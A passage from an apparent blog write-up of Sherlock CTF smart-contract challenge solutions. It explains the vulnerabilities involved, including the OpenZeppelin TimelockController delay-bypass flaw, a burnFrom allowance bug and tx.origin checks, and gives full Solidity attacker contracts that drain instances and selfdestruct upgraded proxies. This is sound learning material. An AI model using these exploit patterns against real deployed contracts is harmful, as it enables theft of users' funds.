<span class="ln">16</span>    <span class="n">predicted</span> <span class="o">=</span> <span class="n">Web3</span><span class="o">.</span><span class="n">toHex</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span> <span class="n">header</span> <span class="o">+</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">saltbytes</span><span class="p">)</span> <span class="o">+</span> <span class="n">hashbytecode</span><span class="p">))[</span><span class="o">-</span><span class="mi">40</span><span class="p">:]</span>
<span class="ln">17</span>
<span class="ln">18</span>    <span class="k">if</span> <span class="s2">&#34;f0b1d&#34;</span> <span class="ow">in</span> <span class="n">predicted</span><span class="p">:</span>
<span class="ln">19</span>        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">predicted</span><span class="p">)</span>
<span class="ln">20</span>        <span class="nb">print</span><span class="p">(</span><span class="n">saltbytes</span><span class="p">)</span>
<span class="ln">21</span>        <span class="n">exit</span><span class="p">()</span>
<span class="ln">22</span>    <span class="k">else</span><span class="p">:</span>
<span class="ln">23</span>        <span class="n">salt</span> <span class="o">=</span> <span class="n">salt</span><span class="o">+</span><span class="mi">1</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Challenge.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">EmptyOne</span> <span class="p">{</span>
<span class="ln"> 6</span><span class="p">}</span>
<span class="ln"> 7</span>
<span class="ln"> 8</span><span class="kd">contract</span> <span class="nc">Thro77leAttacker</span> <span class="p">{</span>
<span class="ln"> 9</span>
<span class="ln">10</span>    <span class="kt">bytes</span> <span class="n">c</span> <span class="o">=</span> <span class="s">hex&#34;6080604052348015600f57600080fd5b50603f80601d6000396000f3fe6080604052600080fdfea264697066735822122051263de48b020bfd029cc7b233b6549029f593de824f0aec76af62fef252447264736f6c63430008040033&#34;</span><span class="p">;</span>
<span class="ln">11</span>    
<span class="ln">12</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Challenge</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">13</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
<span class="ln">14</span>
<span class="ln">15</span>        <span class="kt">bytes</span> <span class="k">memory</span> <span class="nb">code</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
<span class="ln">16</span>       
<span class="ln">17</span>        <span class="k">payable</span><span class="p">(</span><span class="mh">0x54b77d402614522EA00064a7f218F1340CF0b1DE</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
<span class="ln">18</span>        <span class="n">instance</span><span class="p">.</span><span class="n">createContract</span><span class="p">(</span><span class="nb">code</span><span class="p">,</span> <span class="mi">21199</span><span class="p">);</span>
<span class="ln">19</span>    <span class="p">}</span>
<span class="ln">20</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">21</span><span class="p">}</span>
</code></pre></div><h3 id="agusduha---thekingisdeadlonglivetheking">agusduha - TheKingIsDeadLongLiveTheKing</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/agusduha/TheKingIsDeadLongLiveTheKing.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/agusduha/Setup.sol">Setup</a></li>
</ul>
<p>This was one of the contracts that took me the longest to figure out how to solve, until I found Santiago Palladino's excellent <a href="https://forum.openzeppelin.com/t/timelockcontroller-vulnerability-post-mortem/14958">post</a> of the vulnerability. I didn't know about it before starting the CTF so this is one of the things I learned. At first, the challenge looked like Ethernaut's <a href="../ethernaut-5/#level-25-motorbike">Level 25: Motorbike</a>, but in this case the proxy owner was not in control of the attacker.</p>
<p>In summary, the <code>KingVault</code> contract is deployed as an UUPS-Upgradeable proxy, and the ownership of that proxy is a self-administered <code>GovernanceTimelock</code> instance. The vulnerability allows the attacker to force the Timelock to execute tasks not allowed bypassing the timeout requirement, by custom crafting a batch call that updates the delay. After that, the attacker can give <code>ADMIN_ROLE</code> to anyone and thus do anything with the contract.</p>
<p>Once the attacker contract has the <code>ADMIN_ROLE</code> for the <code>GovernanceTimelock</code>, it can schedule and execute an action to update the <code>KingVault</code> instance implementation with one containing a <code>selfdestruct</code> call to drain the proxy.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln">  1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln">  2</span>
<span class="ln">  3</span><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
<span class="ln">  4</span>
<span class="ln">  5</span><span class="kd">contract</span> <span class="nc">Killer</span> <span class="k">is</span> <span class="n">UUPSUpgradeable</span> <span class="p">{</span>
<span class="ln">  6</span>
<span class="ln">  7</span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="kt">address</span> <span class="n">gt</span><span class="p">,</span> <span class="kt">address</span> <span class="n">att</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">  8</span>        <span class="n">GovernanceTimelock</span> <span class="n">g</span> <span class="o">=</span> <span class="n">GovernanceTimelock</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">gt</span><span class="p">));</span>
<span class="ln">  9</span>
<span class="ln"> 10</span>        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">batch1_addresses</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">4</span><span class="p">);</span>
<span class="ln"> 11</span>        <span class="kt">uint256</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">batch1_values</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">uint256</span><span class="p">[](</span><span class="mi">4</span><span class="p">);</span>
<span class="ln"> 12</span>        <span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">batch1_calldata</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="mi">4</span><span class="p">);</span>
<span class="ln"> 13</span>
<span class="ln"> 14</span>        <span class="n">g</span><span class="p">.</span><span class="n">grantRole</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;PROPOSER_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln"> 15</span>
<span class="ln"> 16</span>        <span class="c1">//Batch 1
</span><span class="ln"> 17</span><span class="c1"></span>        <span class="c1">//First call to updateDelay
</span><span class="ln"> 18</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">gt</span><span class="p">);</span>
<span class="ln"> 19</span>        <span class="n">batch1_values</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln"> 20</span>        <span class="n">batch1_calldata</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;updateDelay(uint64)&#34;</span><span class="p">,</span> <span class="kt">uint64</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
<span class="ln"> 21</span>
<span class="ln"> 22</span>        <span class="c1">//Then call to grantrole
</span><span class="ln"> 23</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">gt</span><span class="p">);</span>
<span class="ln"> 24</span>        <span class="n">batch1_values</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln"> 25</span>        <span class="n">batch1_calldata</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;grantRole(bytes32,address)&#34;</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;ADMIN_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln"> 26</span>
<span class="ln"> 27</span>        <span class="n">batch1_addresses</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">gt</span><span class="p">);</span>
<span class="ln"> 28</span>        <span class="n">batch1_values</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln"> 29</span>        <span class="n">batch1_calldata</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;grantRole(bytes32,address)&#34;</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;ADMIN_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">att</span><span class="p">));</span>
<span class="ln"> 30</span>
<span class="ln"> 31</span>        <span class="c1">//Last call to relay the attack to the contract
</span><span class="ln"> 32</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">);</span>
<span class="ln"> 33</span>        <span class="n">batch1_values</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln"> 34</span>        <span class="n">batch1_calldata</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;attack(address,address)&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">gt</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">att</span><span class="p">));</span>
<span class="ln"> 35</span>
<span class="ln"> 36</span>        <span class="n">g</span><span class="p">.</span><span class="n">schedule</span><span class="p">(</span><span class="n">batch1_addresses</span><span class="p">,</span> <span class="n">batch1_values</span><span class="p">,</span> <span class="n">batch1_calldata</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln"> 37</span>
<span class="ln"> 38</span>    <span class="p">}</span>
<span class="ln"> 39</span>
<span class="ln"> 40</span>    <span class="kd">function</span> <span class="nf">kill</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln"> 41</span>        <span class="nb">selfdestruct</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
<span class="ln"> 42</span>    <span class="p">}</span>
<span class="ln"> 43</span>
<span class="ln"> 44</span>    <span class="kd">function</span> <span class="nf">_authorizeUpgrade</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">)</span> <span class="k">internal</span> <span class="k">override</span> <span class="p">{}</span>
<span class="ln"> 45</span><span class="p">}</span>
<span class="ln"> 46</span>
<span class="ln"> 47</span><span class="kd">contract</span> <span class="nc">agusduhaAttacker</span> <span class="p">{</span>
<span class="ln"> 48</span>
<span class="ln"> 49</span>    <span class="n">KingVault</span> <span class="n">kv</span><span class="p">;</span>
<span class="ln"> 50</span>    <span class="n">KingVault</span> <span class="n">kvp</span><span class="p">;</span>
<span class="ln"> 51</span>    <span class="n">GovernanceTimelock</span> <span class="n">gt</span><span class="p">;</span>
<span class="ln"> 52</span>
<span class="ln"> 53</span>    <span class="kt">address</span><span class="p">[]</span> <span class="n">batch1_addresses</span><span class="p">;</span>
<span class="ln"> 54</span>    <span class="kt">uint256</span><span class="p">[]</span> <span class="n">batch1_values</span><span class="p">;</span>
<span class="ln"> 55</span>    <span class="kt">bytes</span><span class="p">[]</span> <span class="n">batch1_calldata</span><span class="p">;</span>
<span class="ln"> 56</span>
<span class="ln"> 57</span>    <span class="kt">address</span><span class="p">[]</span> <span class="n">batch2_addresses</span><span class="p">;</span>
<span class="ln"> 58</span>    <span class="kt">uint256</span><span class="p">[]</span> <span class="n">batch2_values</span><span class="p">;</span>
<span class="ln"> 59</span>    <span class="kt">bytes</span><span class="p">[]</span> <span class="n">batch2_calldata</span><span class="p">;</span>
<span class="ln"> 60</span>
<span class="ln"> 61</span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">inst</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 62</span>        <span class="n">kv</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="n">inst</span><span class="p">).</span><span class="n">kingVault</span><span class="p">();</span>
<span class="ln"> 63</span>        <span class="n">kvp</span> <span class="o">=</span> <span class="n">KingVault</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">Setup</span><span class="p">(</span><span class="n">inst</span><span class="p">).</span><span class="n">instance</span><span class="p">()));</span>
<span class="ln"> 64</span>        <span class="n">gt</span> <span class="o">=</span> <span class="n">GovernanceTimelock</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">kvp</span><span class="p">.</span><span class="n">owner</span><span class="p">()));</span>
<span class="ln"> 65</span>        <span class="n">Killer</span> <span class="n">k</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Killer</span><span class="p">();</span>
<span class="ln"> 66</span>
<span class="ln"> 67</span>        <span class="c1">//Batch 1
</span><span class="ln"> 68</span><span class="c1"></span>        <span class="c1">//First call to updateDelay
</span><span class="ln"> 69</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">gt</span><span class="p">));</span>
<span class="ln"> 70</span>        <span class="n">batch1_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln"> 71</span>        <span class="n">batch1_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;updateDelay(uint64)&#34;</span><span class="p">,</span> <span class="kt">uint64</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
<span class="ln"> 72</span>
<span class="ln"> 73</span>        <span class="c1">//Then call to grantrole
</span><span class="ln"> 74</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">gt</span><span class="p">));</span>
<span class="ln"> 75</span>        <span class="n">batch1_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln"> 76</span>        <span class="n">batch1_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;grantRole(bytes32,address)&#34;</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;ADMIN_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">k</span><span class="p">)));</span>
<span class="ln"> 77</span>
<span class="ln"> 78</span>        <span class="n">batch1_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">gt</span><span class="p">));</span>
<span class="ln"> 79</span>        <span class="n">batch1_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln"> 80</span>        <span class="n">batch1_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;grantRole(bytes32,address)&#34;</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;ADMIN_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
<span class="ln"> 81</span>
<span class="ln"> 82</span>        <span class="c1">//Last call to relay the attack to the contract
</span><span class="ln"> 83</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">k</span><span class="p">));</span>
<span class="ln"> 84</span>        <span class="n">batch1_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln"> 85</span>        <span class="n">batch1_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;attack(address,address)&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">gt</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
<span class="ln"> 86</span>
<span class="ln"> 87</span>        <span class="c1">//Call
</span><span class="ln"> 88</span><span class="c1"></span>        <span class="n">gt</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">batch1_addresses</span><span class="p">,</span> <span class="n">batch1_values</span><span class="p">,</span> <span class="n">batch1_calldata</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln"> 89</span>        <span class="n">gt</span><span class="p">.</span><span class="n">grantRole</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;PROPOSER_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln"> 90</span>
<span class="ln"> 91</span>        <span class="n">batch2_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">kvp</span><span class="p">));</span>
<span class="ln"> 92</span>        <span class="n">batch2_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln"> 93</span>        <span class="n">batch2_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;upgradeToAndCall(address,bytes)&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">k</span><span class="p">),</span> <span class="s">hex&#34;41c0e1b5&#34;</span><span class="p">));</span>
<span class="ln"> 94</span>
<span class="ln"> 95</span>        <span class="n">gt</span><span class="p">.</span><span class="n">schedule</span><span class="p">(</span><span class="n">batch2_addresses</span><span class="p">,</span> <span class="n">batch2_values</span><span class="p">,</span> <span class="n">batch2_calldata</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln"> 96</span>        <span class="n">gt</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">batch2_addresses</span><span class="p">,</span> <span class="n">batch2_values</span><span class="p">,</span> <span class="n">batch2_calldata</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln"> 97</span>
<span class="ln"> 98</span>    <span class="p">}</span>
<span class="ln"> 99</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">100</span><span class="p">}</span>
</code></pre></div><h3 id="bahurum---inflation">bahurum - Inflation</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/bahurum/Inflation.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/bahurum/Setup.sol">Setup</a></li>
</ul>
<p>The contract implements an inflationary token that mints some percentage of the total supply every 2 operations. These operations include minting, burning, or transferring tokens. The goal is to empty the instance's balance.</p>
<p>At first sight there's nothing vulnerable in the contract, and since the token mints, the balance is ever increasing. However, there's a bug in the <code>burnFrom(address,uint256)</code> implementation that calls <code>_spendAllowance(address,address,uint256)</code> with the wrong argument order. This allows to burn tokens on behalf of the instance. However, since the contract mints in the <code>burnFrom(address,uint256)</code> call, the function has to be called twice.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">bahurumAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Inflation</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="n">InflationaryToken</span><span class="p">(</span><span class="n">instance</span><span class="p">.</span><span class="n">tokenAddress</span><span class="p">()).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">),</span> <span class="mi">5000</span><span class="p">);</span>
<span class="ln"> 9</span>        <span class="n">InflationaryToken</span><span class="p">(</span><span class="n">instance</span><span class="p">.</span><span class="n">tokenAddress</span><span class="p">()).</span><span class="n">burnFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">),</span> <span class="mi">1000</span><span class="p">);</span>
<span class="ln">10</span>        <span class="n">InflationaryToken</span><span class="p">(</span><span class="n">instance</span><span class="p">.</span><span class="n">tokenAddress</span><span class="p">()).</span><span class="n">burnFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">),</span> <span class="mi">100</span><span class="p">);</span>
<span class="ln">11</span>    <span class="p">}</span>
<span class="ln">12</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">13</span><span class="p">}</span>
</code></pre></div><h3 id="band0x---becomemaster">band0x - BecomeMaster</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/band0x/BecomeMaster.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/band0x/Setup.sol">Setup</a></li>
</ul>
<p>The contract has two roles: <code>admin</code> and <code>master</code>. <code>master</code> gets initialized to the <code>Setup</code> contract upon deployment, and the goal to beat the level is to change the <code>master</code> and empty the instance balance. There are two convenient functions for these actions: <code>takeMasterRole()</code> that only the <code>admin</code> can call, and <code>collectAllocations</code>, that only the <code>master</code> can call. Also there's another convenient function to become admin, called <code>allocate()</code>.</p>
<p>The contract uses <code>tx.origin</code> to validate the addresses, and some functions implement a modifier that allows them to be called from contracts. However, the solution was simple enough.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">11</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./BecomeMaster.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">band0xAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">BecomeMaster</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="n">instance</span><span class="p">.</span><span class="n">allocate</span><span class="p">();</span>
<span class="ln"> 9</span>        <span class="n">instance</span><span class="p">.</span><span class="n">takeMasterRole</span><span class="p">();</span>
<span class="ln">10</span>        <span class="n">instance</span><span class="p">.</span><span class="n">collectAllocations</span><span class="p">();</span>
<span class="ln">11</span>    <span class="p">}</span>
<span class="ln">12</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">13</span><span class="p">}</span>
</code></pre></div><h3 id="chaboo---swisstreasury">chaboo - SwissTreasury</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/chaboo/SwissTreasury.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/chaboo/Setup.sol">Setup</a></li>
</ul>
<p>This challenge implements the same vulnerability as <a href="#agusduha---thekingisdeadlonglivetheking">agusduha</a>, but way better hidden. In fact, the author used an old version of an OpenZeppelin library that still had the bug, so it was a bit difficult to test locally without knowing this detail. Checking the verified contracts on Etherscan showed the bug is present and the exploit is similar to agusduha's. Definitely evil.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">Helper</span> <span class="p">{</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="kt">address</span> <span class="n">inst</span><span class="p">,</span> <span class="kt">address</span> <span class="n">exp</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln"> 8</span>        
<span class="ln"> 9</span>        <span class="n">TimelockController</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">TimelockController</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">inst</span><span class="p">));</span>
<span class="ln">10</span>
<span class="ln">11</span>        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">batch1_addresses</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">4</span><span class="p">);</span>
<span class="ln">12</span>        <span class="kt">uint256</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">batch1_values</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">uint256</span><span class="p">[](</span><span class="mi">4</span><span class="p">);</span>
<span class="ln">13</span>        <span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">batch1_calldata</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="mi">4</span><span class="p">);</span>
<span class="ln">14</span>
<span class="ln">15</span>        <span class="n">tc</span><span class="p">.</span><span class="n">grantRole</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;PROPOSER_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln">16</span>
<span class="ln">17</span>
<span class="ln">18</span>        <span class="c1">//Batch 1
</span><span class="ln">19</span><span class="c1"></span>        <span class="c1">//First call to updateDelay
</span><span class="ln">20</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
<span class="ln">21</span>        <span class="n">batch1_values</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">22</span>        <span class="n">batch1_calldata</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;updateDelay(uint256)&#34;</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
<span class="ln">23</span>
<span class="ln">24</span>        <span class="c1">//Then call to grantrole
</span><span class="ln">25</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
<span class="ln">26</span>        <span class="n">batch1_values</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
